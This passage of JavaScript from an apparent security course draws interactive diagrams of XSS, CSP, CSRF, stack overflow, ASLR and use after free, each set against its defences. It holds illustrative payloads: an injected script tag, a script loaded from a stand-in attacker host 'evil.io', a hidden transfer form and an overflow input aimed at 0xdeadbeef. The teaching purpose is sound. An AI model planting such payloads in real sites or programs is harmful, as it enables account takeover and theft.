    sub: 'If a page puts user supplied text into its HTML without encoding it, a browser cannot tell the attacker’s script from the site’s own. The script then runs with the site’s origin: it can read the page, act as the user and send data away.',
    W: 600, H: 340,
    params: [
      { k: 'kind', label: 'Type', type: 'select', v: 'stored', opts: [['stored', 'Stored (a comment on a forum)'], ['reflected', 'Reflected (a crafted search link)']] },
      { k: 'def', label: 'Defence', type: 'select', v: 'none', opts: [['none', 'none'], ['enc', 'output encoding'], ['csp', 'no encoding, but a strict CSP']] }
    ],
    tips: [
      { t: 'Play a stored XSS with no defence. Every visitor who opens the thread runs the attacker’s script.', play: true },
      { t: 'Turn on output encoding. The same text arrives as &amp;lt;script&amp;gt; and is shown, not run.', set: { def: 'enc' }, play: true },
      { t: 'Try a strict CSP without encoding. The browser builds the script element but refuses to run it, because it has no nonce. A useful second layer.', set: { def: 'csp' }, play: true }
    ],
    frames(p) {
      const st = p.kind === 'stored', d = p.def;
      const html = d === 'enc' ? '&lt;script&gt;steal()&lt;/script&gt;' : PAY;
      const fr = [
        { st: 1, say: st ? `The attacker posts a comment: <code>${PAY.replace(/</g, '&lt;')}</code>. The server saves it in the database.` : `The attacker sends the victim a link: <code>/search?q=${PAY.replace(/</g, '&lt;')}</code>, perhaps hidden behind a short URL.` },
        { st: 2, say: st ? 'Later the victim, logged in, opens the thread. The server reads the comment and builds the page.' : 'The victim clicks. The server builds a page that says "Results for" followed by q.' },
        { st: 3, say: d === 'enc' ? 'The template encodes the text: &lt; becomes &amp;lt; and so on. The HTML sent is plain text that looks like code.' : `The HTML sent contains the raw text <code>${PAY.replace(/</g, '&lt;')}</code>${d === 'csp' ? ', together with a header Content-Security-Policy: script-src \'nonce-…\'' : ''}.` },
        { st: 4, say: d === 'enc' ? 'The browser shows the characters &lt;script&gt; on screen. No script element exists.' : d === 'csp' ? 'The browser creates a script element, checks the policy, sees no matching nonce and blocks it, logging a CSP violation report.' : 'The browser creates a script element and runs it, with the site’s origin. To the browser it is the site’s own code.' },
        { st: 5, done: true, ran: d === 'none', say: d === 'none' ? `steal() runs: it can read the page and any non HttpOnly cookies, make requests as the user, or show a fake login form. ${st ? 'A stored XSS hits every visitor. In 2005 the Samy worm used one to add over a million MySpace friends in about 20 hours.' : 'A reflected XSS needs each victim to open the link.'}` : d === 'enc' ? 'Safe. Encoding at output, for the right context, is the main defence. Modern frameworks such as React, Angular and Django templates do it by default.' : 'Blocked by CSP. The bug is still there and should be fixed, but the policy stopped this exploit.' }
      ];
      return fr.map(x => ({ ...x, st0: st, d, html }));
    },
    paint(z, f) {
      const col = z.col, g = z.g;
      cbox(z, 14, 16, 120, 50, ['Attacker'], { s: 12, b: true, fill: 'rgba(225,29,72,0.15)' });
      cbox(z, 240, 16, 120, 50, [f.st0 ? 'Forum server' : 'Search server', f.st0 ? '+ database' : ''], { s: 12, b: true, fill: col.surf });
      cbox(z, 466, 16, 120, 50, ['Victim browser', 'logged in'], { s: 12, b: true, fill: col.surf });
      if (f.st >= 1) { if (f.st0) D.arrow(g, 134, 41, 240, 41, col.red, 2); else D.arrow(g, 134, 30, 466, 30, col.red, 2); cbox(z, 14, 76, 230, 26, f.st0 ? 'POST comment' : 'link with ?q=<script>…', { s: 11, b: true, mono: true, fill: col.bg }); }
      if (f.st >= 2) { D.arrow(g, 466, 56, 360, 56, col.ink2, 2); }
      if (f.st >= 3) { D.arrow(g, 360, 64, 466, 64, f.d === 'enc' ? col.cv : col.orange, 2.5); cbox(z, 150, 116, 436, 34, ['HTML sent: ' + (f.d === 'enc' ? '&lt;script&gt;steal()&lt;/script&gt;' : '<script>steal()</script>')], { s: 11, b: true, mono: true, fill: f.d === 'enc' ? 'rgba(15,118,110,0.15)' : 'rgba(234,88,12,0.15)' }); if (f.d === 'csp') cbox(z, 150, 156, 436, 26, "header: script-src 'nonce-r4nd0m' 'strict-dynamic'", { s: 11, b: true, mono: true, fill: col.bg }); }
      if (f.st >= 4) {
        const t = f.d === 'enc' ? 'screen shows the text <script>steal()</script>' : f.d === 'csp' ? 'script element created, CSP check fails: blocked' : 'script element created and executed';
        cbox(z, 150, 196, 436, 34, t, { s: 12, b: true, fill: f.d === 'none' ? 'rgba(225,29,72,0.2)' : 'rgba(15,118,110,0.2)' });
      }
      if (f.st >= 5 && f.ran) { D.arrow(g, 470, 22, 134, 22, col.red, 2.5); cbox(z, 150, 244, 436, 30, 'data and actions sent to the attacker', { s: 12, b: true, fill: col.red, c: '#fff' }); }
      if (f.done) cbox(z, 14, 306, 572, 28, f.ran ? 'XSS: attacker code ran with the site’s origin' : f.d === 'enc' ? 'encoded: shown as text' : 'blocked by Content Security Policy', { s: 13, b: true, fill: f.ran ? col.red : col.cv, c: '#fff' });
    }
  });
})();

/* =====================================================================================================
   Application Security 1.3  Content Security Policy: which scripts a browser lets run
   ===================================================================================================== */
(() => {
  const { trace } = MLZ;
  const { cbox, D } = CYZ;
  const POL = {
    weak: ["script-src 'self' 'unsafe-inline' cdn.example.com", [1, 1, 1, 0]],
    list: ["script-src 'self' cdn.example.com", [0, 0, 1, 0]],
    strict: ["script-src 'nonce-r4nd0m' 'strict-dynamic'", [1, 0, 0, 0]]
  };
  const SC = [
    ['<script nonce="r4nd0m">initMenu()</script>', 'the site’s own inline script'],
    ['<script>steal(document.cookie)</script>', 'injected by XSS'],
    ['<script src="https://cdn.example.com/lib.js">', 'a library on a listed CDN'],
    ['<script src="https://evil.io/x.js">', 'injected, from the attacker’s host']
  ];
  const WHY = {
    weak: ["'unsafe-inline' allows it", "'unsafe-inline' allows every inline script, including injected ones", 'host is listed', 'host not listed'],
    list: ['inline scripts need a nonce or hash', 'inline scripts need a nonce or hash', 'host is listed', 'host not listed'],
    strict: ['nonce matches', 'no nonce', 'no nonce (add one, or load it from a trusted script)', 'no nonce']
  };
  trace('cycsp', {
    title: 'Content Security Policy: a script allow list in a header',
    sub: 'A CSP header tells the browser which scripts may run. Even if an attacker injects a script tag, the browser refuses to run it unless the policy allows it. The choice of policy decides whether it helps at all.',
    W: 600, H: 340,
    params: [
      { k: 'pol', label: 'Policy', type: 'select', v: 'weak', opts: [['weak', "with 'unsafe-inline'"], ['list', 'host allow list'], ['strict', 'strict: nonce + strict-dynamic']] }
    ],
    tips: [
      { t: "Play the weak policy. 'unsafe-inline' lets the injected inline script run, so the policy does nothing against classic XSS.", play: true },
      { t: 'Try a host allow list. Inline injection is blocked, but the site must move its own inline code to files, and any script on a listed host is trusted.', set: { pol: 'list' }, play: true },
      { t: 'Try the strict policy. Only scripts carrying the random nonce run. Google found this style far harder to bypass than allow lists.', set: { pol: 'strict' }, play: true }
    ],
    frames(p) {
      const [text, ok] = POL[p.pol], fr = [{ st: 0, n: 0, say: `The response carries Content-Security-Policy: ${text}. The page contains four scripts. Two are the site’s, two were injected.` }];
      SC.forEach(([tag, who], i) => fr.push({ st: 1, n: i + 1, say: `${who}: ${ok[i] ? '<b>runs</b>' : '<b>blocked</b>'}, ${WHY[p.pol][i]}.` }));
      const bad = ok[1] + ok[3], good = ok[0] + ok[2];
      fr.push({ st: 2, done: true, n: 4, bad, good, say: bad ? `An injected script ran, so this policy fails against XSS. Weichselbaum and colleagues at Google studied about 26000 real policies in 2016 and found almost 95% could be bypassed, mostly through 'unsafe-inline' or overly broad host lists.` : `No injected script ran. ${good < 2 ? 'Some of the site’s own scripts were blocked too, so roll a policy out first with Content-Security-Policy-Report-Only and fix what breaks.' : ''} A fresh random nonce must be generated for every response, or attackers can reuse it.` });
      return fr.map(x => ({ ...x, text, ok }));
    },
    paint(z, f) {
      const col = z.col, g = z.g;
      cbox(z, 14, 12, 572, 30, f.text, { s: 12, b: true, mono: true, fill: col.surf });
      SC.forEach(([tag, who], i) => {
        const y = 54 + i * 56, inj = i % 2 === 1;
        cbox(z, 14, y, 410, 46, [tag, who], { s: 11, b: true, mono: false, fill: inj ? 'rgba(225,29,72,0.1)' : col.bg });
        if (f.n > i) cbox(z, 434, y + 6, 152, 34, f.ok[i] ? 'RUN' : 'BLOCK', { s: 13, b: true, fill: f.ok[i] ? (inj ? col.red : col.cv) : (inj ? col.green : col.ink2), c: '#fff' });
      });
      if (f.done) cbox(z, 14, 306, 572, 28, f.bad ? 'policy bypassed: injected code ran' : 'every injected script blocked', { s: 13, b: true, fill: f.bad ? col.red : col.cv, c: '#fff' });
    }
  });
})();

/* =====================================================================================================
   Application Security 1.3  Cross site request forgery: a hidden form on an evil page, and two defences
   ===================================================================================================== */
(() => {
  const { trace } = MLZ;
  const { cbox, D } = CYZ;
  trace('cycsrf', {
    title: 'Cross site request forgery (CSRF)',
    sub: 'The victim is logged in to the bank in one tab and opens an evil page in another. The evil page submits a hidden form to the bank. The browser attaches the bank’s cookie, so without a defence the bank sees a genuine request from its customer.',
    W: 600, H: 340,
    params: [
      { k: 'def', label: 'Bank’s defence', type: 'select', v: 'none', opts: [['none', 'none'], ['token', 'CSRF token in every form'], ['lax', 'session cookie SameSite=Lax']] }
    ],
    tips: [
      { t: 'Play with no defence. The transfer goes through, sent by the victim’s own browser.', play: true },
      { t: 'Add a CSRF token. The evil page cannot read the bank’s pages, so it cannot know the token, and the bank refuses the form.', set: { def: 'token' }, play: true },
      { t: 'Use SameSite=Lax instead. The browser leaves the cookie off the cross site POST, so the request arrives logged out.', set: { def: 'lax' }, play: true }
    ],
    frames(p) {
      const d = p.def;
      const fr = [
        { st: 1, say: 'The victim logs in to bank.example. The browser stores the session cookie.' },
        { st: 2, say: 'In another tab the victim opens evil.io, perhaps from a link in an email or an advert.' },
        { st: 3, say: 'evil.io contains a hidden form: action="https://bank.example/transfer", to=attacker, amount=5000, and a script that submits it at once.' },
        { st: 4, say: d === 'lax' ? 'The browser sees a cross site POST. The cookie is SameSite=Lax, so it is <b>not</b> attached.' : 'The browser sends the POST to bank.example and attaches the bank’s cookie, as it does for any request to that site.' },
        { st: 5, say: d === 'lax' ? 'The bank sees no session and asks for a login. Nothing happens.' : d === 'token' ? 'The bank looks for the hidden csrf_token field. The form has none, because evil.io could not read it from the bank’s pages. Refused.' : 'The bank checks the cookie: valid session. It has no other check, so it performs the transfer.' },
        { st: 6, done: true, ok: d === 'none', say: d === 'none' ? 'CSRF succeeded. In 2008 Zeller and Felten at Princeton found CSRF bugs that allowed money transfers at ING Direct and account changes at YouTube and others. The attacker never saw the cookie: they borrowed the browser.' : d === 'token' ? 'Blocked by the token. Tokens should be random or HMAC based, tied to the session, and checked on every state changing request.' : 'Blocked by SameSite. Use both: SameSite as a default layer, tokens for strong protection, and never change state with GET requests.' }
      ];
      return fr.map(x => ({ ...x, d }));
    },
    paint(z, f) {
      const col = z.col, g = z.g;
      cbox(z, 14, 110, 150, 70, ['Victim browser', 'cookie for bank.example'], { s: 12, b: true, fill: col.surf });
      cbox(z, 436, 30, 150, 56, ['bank.example'], { s: 13, b: true, fill: col.surf });
      cbox(z, 436, 200, 150, 56, ['evil.io'], { s: 13, b: true, fill: 'rgba(225,29,72,0.15)' });
      if (f.st >= 1) { D.arrow(g, 164, 120, 436, 58, col.cv, 2); D.text(g, 'login, Set-Cookie', 300, 80, { a: 'center', s: 11, c: col.ink2 }); }
      if (f.st >= 2) D.arrow(g, 164, 170, 436, 228, col.ink2, 2);
      if (f.st >= 3) cbox(z, 180, 220, 240, 44, ['hidden form, auto submit', 'to=attacker amount=5000'], { s: 11, b: true, mono: true, fill: col.bg });
      if (f.st >= 4) { D.arrow(g, 164, 140, 436, 70, col.orange, 3); cbox(z, 200, 120, 210, 28, f.d === 'lax' ? 'POST, no cookie' : 'POST + bank cookie', { s: 11, b: true, mono: true, fill: f.d === 'lax' ? 'rgba(15,118,110,0.2)' : 'rgba(234,88,12,0.2)' }); }
      if (f.st >= 5) cbox(z, 436, 94, 150, 50, f.d === 'none' ? ['session valid', 'transfer done'] : f.d === 'token' ? ['no csrf_token', 'refused'] : ['no session', 'refused'], { s: 12, b: true, fill: f.d === 'none' ? col.red : col.cv, c: '#fff' });
      if (f.done) cbox(z, 14, 306, 572, 28, f.ok ? 'CSRF: 5000 sent to the attacker' : f.d === 'token' ? 'blocked by the CSRF token' : 'blocked by SameSite=Lax', { s: 13, b: true, fill: f.ok ? col.red : col.cv, c: '#fff' });
    }
  });
})();

/* =====================================================================================================
   Application Security 2.1  A stack buffer overflow, byte by byte, with and without a stack canary
   ===================================================================================================== */
(() => {
  const { trace } = MLZ;
  const { cbox, D } = CYZ;
  const IN = { ok: 'alice', mid: 'AAAAAAAAAAAAAAAABBBB', full: 'AAAAAAAAAAAAAAAABBBBBBBB' + 'efbeadde0000' };
  trace('cystack', {
    title: 'Stack buffer overflow: writing past a 16 byte buffer',
    sub: 'A function keeps a 16 byte buffer on the stack. Just above it sit a canary value and the saved return address, which tells the CPU where to go when the function ends. Copying input without checking its length overwrites them.',
    W: 600, H: 340,
    params: [
      { k: 'in', label: 'Input', type: 'select', v: 'full', opts: [['ok', '"alice" (5 bytes)'], ['mid', '20 bytes'], ['full', '32 bytes ending in an address']] },
      { k: 'can', label: 'Stack canary', type: 'select', v: 'off', opts: [['off', 'off'], ['on', 'on (-fstack-protector)']] }
    ],
    tips: [
      { t: 'Play 32 bytes with no canary. The last 8 bytes replace the return address, so the function "returns" wherever the attacker likes.', play: true },
      { t: 'Turn the canary on. The overflow must pass through the canary to reach the return address, the check at return notices, and the program stops.', set: { can: 'on' }, play: true },
      { t: 'Try a short input. Nothing beyond the buffer changes.', set: { in: 'ok' }, play: true }
    ],
    frames(p) {
      const n = p.in === 'ok' ? 5 : p.in === 'mid' ? 20 : 32, can = p.can === 'on';
      const smashCan = n > 16, smashRet = n > 24;
      const fr = [
        { st: 1, n: 0, say: 'The frame: buf[16] at the lowest addresses, then an 8 byte canary (a random value set when the program starts), then the 8 byte saved return address 0x401136.' },
        { st: 2, n: 0, say: `strcpy(buf, input) is called with ${n} bytes. strcpy copies until the end of the input and never looks at the size of buf.` },
        { st: 3, n: Math.min(n, 16), say: `Bytes 0 to ${Math.min(n, 16) - 1} go into buf.${n <= 16 ? ' The input fits.' : ' The buffer is now full, but copying continues.'}` },
        { st: 4, n, say: n <= 16 ? 'Nothing else was touched.' : smashRet ? 'Bytes 16 to 23 overwrite the canary, and bytes 24 to 31 overwrite the return address with 0xdeadbeef, chosen by the attacker.' : 'Bytes 16 to 19 overwrite part of the canary. The return address is still intact.' },
        { st: 5, done: true, n, say: !smashCan ? 'The function returns to 0x401136 as normal.' : can ? '<b>*** stack smashing detected ***</b>. Before returning, the compiler’s check compares the canary with the saved copy. It differs, so the program aborts instead of jumping. StackGuard introduced this idea in 1998.' : smashRet ? 'The function returns to 0xdeadbeef. In a real attack this points to the attacker’s code or, with non executable stacks, to a chain of existing code fragments (return oriented programming). The Morris worm of 1988 used exactly this bug in fingerd.' : 'The function returns normally, but memory was corrupted. Without a canary nobody noticed.' }
      ];
      return fr.map(x => ({ ...x, total: n, can, smashCan, smashRet, input: IN[p.in] }));
    },
    paint(z, f) {
      const col = z.col, g = z.g, cw = 17, x0 = 28, y0 = 70;
      const label = (x, w, t, c) => { D.rect(g, x, y0 - 30, w, 22, { fill: c }); D.text(g, t, x + w / 2, y0 - 15, { a: 'center', s: 11, b: true, c: col.ink }); };
      label(x0, 16 * cw, 'buf[16]', 'rgba(15,118,110,0.18)'); label(x0 + 16 * cw, 8 * cw, f.can ? 'canary' : 'padding', 'rgba(234,88,12,0.18)'); label(x0 + 24 * cw, 8 * cw, 'return address', 'rgba(124,58,237,0.18)');
      const ret = '36114000 00000000'.replace(' ', ''), canv = '00942d7b5e3c1f8a';
      for (let i = 0; i < 32; i++) {
        const w = i < f.n, over = w && i >= 16;
        let t = '';
        if (w) t = i < 24 || f.input.length <= 24 ? (f.input[i] || '') : f.input.slice(24 + (i - 24) * 2, 26 + (i - 24) * 2) || '00';
        else if (i >= 24) t = ret.slice((i - 24) * 2, (i - 24) * 2 + 2);
        else if (i >= 16) t = f.can ? canv.slice((i - 16) * 2, (i - 16) * 2 + 2) : '..';
        D.rect(g, x0 + i * cw, y0, cw - 1, 30, { fill: over ? col.red : w ? col.cv : col.bg, stroke: col.line });
        D.text(g, t, x0 + i * cw + cw / 2, y0 + 19, { a: 'center', s: t.length > 1 ? 8 : 11, b: true, mono: true, c: w ? '#fff' : col.ink2 });
      }
      D.text(g, 'low addresses', x0, y0 + 46, { s: 10, c: col.ink2 }); D.text(g, 'high addresses', x0 + 32 * cw, y0 + 46, { a: 'end', s: 10, c: col.ink2 });
      if (f.st >= 2) cbox(z, 14, 130, 572, 34, `strcpy(buf, input)   input length = ${f.total} bytes`, { s: 12, b: true, mono: true, fill: col.surf });
      if (f.st >= 5) {
        const t = !f.smashCan ? 'ret → 0x401136 (normal)' : f.can ? 'canary changed → abort' : f.smashRet ? 'ret → 0xdeadbeef (attacker)' : 'ret → 0x401136, memory silently corrupted';
        cbox(z, 14, 180, 572, 40, t, { s: 13, b: true, mono: true, fill: f.smashRet && !f.can ? 'rgba(225,29,72,0.2)' : 'rgba(15,118,110,0.15)' });
      }
      if (f.done) cbox(z, 14, 306, 572, 28, !f.smashCan ? 'input fit: safe' : f.can ? 'overflow detected by the canary' : f.smashRet ? 'control flow hijacked' : 'memory corrupted, not detected', { s: 13, b: true, fill: f.smashRet && !f.can ? col.red : f.smashCan && !f.can ? col.orange : col.cv, c: '#fff' });
    }
  });
})();

/* =====================================================================================================
   Application Security 2.1  ASLR as a guessing game: same layout after a crash, or a fresh one
   ===================================================================================================== */
(() => {
  const { trace } = MLZ;
  const { cbox, D } = CYZ;
  trace('cyaslr', {
    title: 'ASLR: guessing where the code lives',
    sub: 'Address space layout randomisation loads code at a random offset, so an exploit must guess where its target is. A wrong guess crashes the process. Here there are only 16 possible offsets (4 bits) so you can watch, real systems use 8 to 28 bits or more.',
    W: 600, H: 340,
    params: [
      { k: 'mode', label: 'After a crash', type: 'select', v: 'fork', opts: [['fork', 'forked child: same layout'], ['rerand', 'restart: fresh random layout']] }
    ],
    tips: [
      { t: 'Play a forking server. Each crash rules out one offset, so the attacker sweeps through them and must win within 16 tries.', play: true },
      { t: 'Try re-randomising restarts. Every try is a new lottery with a 1 in 16 chance, and past failures teach nothing.', set: { mode: 'rerand' }, play: true }
    ],
    frames(p) {
      let seed = 12345; const rnd = () => (seed = (seed * 1103515245 + 12345) % 2147483648) / 2147483648;
      const fork = p.mode === 'fork', fr = [];
      let secret = 11, tried = [], hit = false, k = 0;
      fr.push({ st: 0, secret, tried: [], say: `The program’s code base is at one of 16 offsets. ${fork ? 'This server forks a child per connection, and children inherit the parent’s layout.' : 'This service re-randomises its layout whenever it restarts after a crash.'}` });
      while (!hit && k < 30) {
        const guess = fork ? k : 0;
        if (!fork && k > 0) secret = Math.floor(rnd() * 16);
        hit = guess === secret; k++;
        tried = fork ? tried.concat([guess]) : [guess];
        fr.push({ st: 1, secret, tried: tried.slice(), guess, hit, k, say: `Try ${k}: the exploit assumes offset ${guess}. ${hit ? '<b>Correct</b>: the jump lands on the intended code.' : `Wrong, the real offset is ${secret}. The process crashes${fork ? ' and the parent forks a new child with the same layout.' : ' and restarts with a new random layout.'}`}` });
      }
      fr.push({ st: 2, done: true, secret, tried, k, hit, guess: secret, say: `Found after ${k} tries. Expected tries: ${fork ? '(16 + 1) / 2 = 8.5 with the same layout' : '16 with fresh layouts'}. With n bits these become (2<sup>n</sup> + 1)/2 and 2<sup>n</sup>. In 2004 Shacham and colleagues beat 16 bit ASLR on a forking web server in about 216 seconds. 64 bit systems have far more bits, and one leaked pointer still defeats ASLR completely.` });
      return fr.map(x => ({ ...x, fork }));
    },
    paint(z, f) {
      const col = z.col, g = z.g, x0 = 20, w = 35;
      for (let i = 0; i < 16; i++) {
        const isS = f.st >= 1 && i === f.secret, t = f.tried.includes(i), isG = i === f.guess && f.st >= 1;
        D.rect(g, x0 + i * w, 60, w - 3, 60, { fill: isG ? (f.hit ? col.green : col.red) : t && f.fork ? col.ink2 : isS ? 'rgba(124,58,237,0.25)' : col.bg, stroke: col.line });
        D.text(g, String(i), x0 + i * w + w / 2 - 1, 96, { a: 'center', s: 13, b: true, c: isG || (t && f.fork) ? '#fff' : col.ink });
      }
      D.text(g, 'possible offsets of the code base', x0, 48, { s: 11, b: true, c: col.ink2 });
      if (f.st >= 1) D.text(g, 'purple = real offset this run', x0, 140, { s: 11, c: col.ink2 });
      cbox(z, 20, 170, 270, 50, ['tries so far', String(f.k || 0)], { s: 14, b: true, fill: col.surf });
      cbox(z, 306, 170, 274, 50, ['chance this try', f.done ? 'found' : f.fork ? `1 / ${16 - Math.max(0, (f.k || 1) - 1)}` : '1 / 16'], { s: 14, b: true, fill: col.surf });
      if (f.done) cbox(z, 14, 306, 572, 28, `offset found after ${f.k} tries (${f.fork ? 'same layout each time' : 'fresh layout each time'})`, { s: 13, b: true, fill: col.red, c: '#fff' });
    }
  });
})();

/* =====================================================================================================
   Application Security 2.1  Use after free: a freed block is reused and an old pointer reads the new owner
   ===================================================================================================== */
(() => {
  const { trace } = MLZ;
  const { cbox, D } = CYZ;
  trace('cyuaf', {
    title: 'Use after free: the dangling pointer',
    sub: 'In C and C++ the program frees memory by hand. If it keeps using a pointer after the free, and the allocator hands the same block to someone else, the old pointer now reads and writes the new owner’s data. Browsers and kernels suffer from this bug class more than any other.',
    W: 600, H: 340,
    params: [
      { k: 'def', label: 'Language or habit', type: 'select', v: 'none', opts: [['none', 'C, pointer kept after free'], ['null', 'C, pointer set to NULL after free'], ['rust', 'Rust ownership rules']] }
    ],
    tips: [
      { t: 'Play the plain C version. The old session pointer ends up pointing at an object the attacker controls, with is_admin set.', play: true },
      { t: 'Set the pointer to NULL after freeing. A later use crashes cleanly instead of reading someone else’s data. Other copies of the pointer can still dangle.', set: { def: 'null' }, play: true },
      { t: 'Try Rust. The compiler refuses to build a program that uses a value after it has been dropped.', set: { def: 'rust' }, play: true }
    ],
    frames(p) {
      const d = p.def;
      const fr = [
        { st: 1, say: 'session = malloc(...) gets heap block 2 and stores alice’s session there: user alice, is_admin false.' },
        { st: 2, say: d === 'rust' ? 'In Rust, drop(session) ends the value’s life. The name session can no longer be used.' : `free(session): block 2 goes back on the free list.${d === 'null' ? ' The code then sets session = NULL.' : ' But the variable session still holds the address of block 2: a dangling pointer.'}` },
        { st: 3, say: d === 'rust' ? 'Any later line that uses session is a compile time error: "borrow of moved value". The program is never built.' : 'The attacker triggers a new allocation of the same size, for example by sending a message. The allocator reuses the most recently freed block, block 2, and fills it with the attacker’s data: user mallory, is_admin true.' },
        { st: 4, done: true, say: d === 'none' ? 'The code later checks session->is_admin through the old pointer and reads <b>true</b>. Real exploits place fake objects with function pointers in the reused block to take control. Hardened allocators, memory tagging (Arm MTE) and safe languages fight this class.' : d === 'null' ? 'Using session now dereferences NULL and the program crashes, a denial of service but not a takeover. Pointers copied elsewhere before the free would still dangle, which is why this habit helps but does not solve the problem.' : 'No dangling pointer can exist. Google reported that as Android wrote new code in memory safe languages, memory safety bugs fell from 76% of its vulnerabilities in 2019 to 24% in 2024.' }
      ];
      return fr.map(x => ({ ...x, d }));
    },
    paint(z, f) {
      const col = z.col, g = z.g;
      D.text(g, 'heap blocks', 20, 30, { s: 11, b: true, c: col.ink2 });
      for (let i = 0; i < 4; i++) {
        let txt = 'free', fill = col.bg;
        if (i === 0) { txt = 'in use'; fill = col.surf; }
        if (i === 2) {
          if (f.st === 1 || (f.st >= 2 && f.d === 'rust' && f.st < 2)) { txt = 'alice, admin=false'; fill = 'rgba(15,118,110,0.2)'; }
          if (f.st === 1) { txt = 'alice, admin=false'; fill = 'rgba(15,118,110,0.2)'; }
          else if (f.st === 2 || (f.d === 'rust' && f.st > 2)) { txt = f.d === 'rust' ? 'dropped' : 'free (on free list)'; fill = col.bg; }
          if (f.st >= 3 && f.d !== 'rust') { txt = 'mallory, admin=true'; fill = 'rgba(225,29,72,0.25)'; }
        }
        cbox(z, 20 + i * 142, 40, 132, 56, [`block ${i}`, txt], { s: 11, b: true, fill });
      }
      const ptr = f.d === 'null' && f.st >= 2 ? 'session = NULL' : f.d === 'rust' && f.st >= 2 ? 'session: moved, unusable' : 'session → block 2';
      cbox(z, 20, 140, 220, 40, ptr, { s: 12, b: true, mono: true, fill: col.surf });
      if (!(f.d !== 'none' && f.st >= 2)) D.arrow(g, 130, 140, 304 + 66 - 50, 96, f.st >= 2 ? col.red : col.cv, 2.5);
      if (f.st >= 3 && f.d !== 'rust') cbox(z, 330, 140, 250, 40, 'attacker = malloc(...) → block 2', { s: 12, b: true, mono: true, fill: 'rgba(225,29,72,0.15)' });
      if (f.st >= 3 && f.d === 'rust') cbox(z, 20, 200, 560, 40, 'error[E0382]: borrow of moved value: `session`', { s: 12, b: true, mono: true, fill: 'rgba(15,118,110,0.2)' });
      if (f.st >= 4 && f.d !== 'rust') cbox(z, 20, 200, 560, 40, f.d === 'none' ? 'if (session->is_admin)  reads true  →  admin access granted' : 'session->is_admin  →  NULL dereference, crash', { s: 12, b: true, mono: true, fill: f.d === 'none' ? 'rgba(225,29,72,0.2)' : col.bg });
      if (f.done) cbox(z, 14, 306, 572, 28, f.d === 'none' ? 'use after free: attacker data read as alice’s session' : f.d === 'null' ? 'crash instead of takeover' : 'rejected at compile time', { s: 13, b: true, fill: f.d === 'none' ? col.red : f.d === 'null' ? col.orange : col.cv, c: '#fff' });
    }
  });
})();
